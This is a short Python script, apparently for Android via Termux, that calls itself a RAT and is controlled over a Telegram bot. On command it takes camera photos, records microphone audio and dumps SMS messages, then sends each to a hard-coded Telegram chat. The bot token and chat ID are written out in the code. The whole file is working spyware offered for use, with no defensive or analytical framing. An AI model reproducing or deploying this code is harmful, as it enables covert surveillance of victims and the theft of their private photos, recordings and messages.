import telebot
import os
import time

TOKEN = "8283668164:AAFBRMnVLlBWk1Fwll-XXPwT8HMujW5EeUo"
CHAT_ID = "7924673792"

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🔥 RAT Activated!")
    os.system("termux-vibrate -d 1000")

@bot.message_handler(commands=['cam'])
def cam(message):
    # Jepret kamera
    os.system("termux-camera-photo cam.jpg")
    with open("cam.jpg", "rb") as photo:
        bot.send_photo(CHAT_ID, photo, caption="📸 Camera captured")
    os.remove("cam.jpg")

@bot.message_handler(commands=['audio'])
def audio(message):
    # Rekam audio 10 detik
    os.system("termux-microphone-record -l 10 audio.aac")
    with open("audio.aac", "rb") as audio_file:
        bot.send_audio(CHAT_ID, audio_file, caption="🎤 Audio recorded")
    os.remove("audio.aac")

@bot.message_handler(commands=['sms'])
def sms(message):
    # Ambil SMS
    os.system("termux-sms-list > sms.txt")
    with open("sms.txt", "rb") as file:
        bot.send_document(CHAT_ID, file, caption="📱 SMS logs")
    os.remove("sms.txt")

print("🤖 Bot running...")
bot.polling()
